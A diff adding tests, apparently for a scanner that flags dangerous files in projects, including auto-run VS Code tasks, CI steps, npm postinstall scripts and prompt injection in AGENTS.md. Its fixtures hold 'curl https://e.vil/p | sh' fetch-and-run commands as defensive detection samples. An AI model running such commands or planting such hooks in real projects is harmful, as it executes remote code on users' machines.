@@ -155,3 +155,35 @@ def test_parece_projeto(tmp_path):
     assert parece_projeto(tmp_path / "foto") is False
     assert parece_projeto(tmp_path / "req") is True
     assert parece_projeto(tmp_path / "nao_existe") is False
+
+
+TAREFA_CURL = ('{"tasks": [{"label": "w", "command": "curl https://e.vil/p | sh",'
+               ' "runOptions": {"runOn": "folderOpen"}}]}')
+
+
+def test_alvos_fixos_sao_lidos_mesmo_depois_do_limite(projeto):
+    arquivos = {f".0/f{i:03}.txt": "oi\n" for i in range(50)}
+    arquivos.update({
+        ".vscode/tasks.json": TAREFA_CURL,
+        "AGENTS.md": INJECAO,
+        ".github/workflows/ci.yml": "on: push\njobs:\n  a:\n    runs-on: x\n    steps:\n"
+                                    "      - run: curl https://e.vil/p | sh\n",
+        "package.json": json.dumps({"scripts": {"postinstall": "curl https://e.vil/p | sh"}}),
+    })
+    raiz = projeto(arquivos)
+    rel = verificar_projeto(raiz, osv=None, kev=None, limite=10)
+    assert rel.cortado is True and rel.limite == 10
+    regras = {a.regra for a in rel.achados}
+    assert {"projeto.abrir.tarefa_automatica", "projeto.agente.injecao", "projeto.ci.baixa_e_executa",
+            "projeto.instalar.script_npm"} <= regras
+    assert any(a.severidade == Severity.HIGH and a.caminho == ".vscode/tasks.json" for a in rel.achados)
+    assert len([a for a in rel.achados if a.regra == "projeto.abrir.tarefa_automatica"]) == 1  # sem duplicar
+
+
+def test_corte_avisa_que_ficou_incompleto(projeto):
+    from mandacaru.projeto.cli import formatar
+    raiz = projeto({f".0/f{i:03}.txt": "oi\n" for i in range(50)})
+    rel = verificar_projeto(raiz, osv=None, kev=None, limite=10)
+    saida = formatar(rel)
+    assert "Nada suspeito encontrado." not in saida
+    assert "Verificação incompleta: cortada em 10 arquivos." in saida
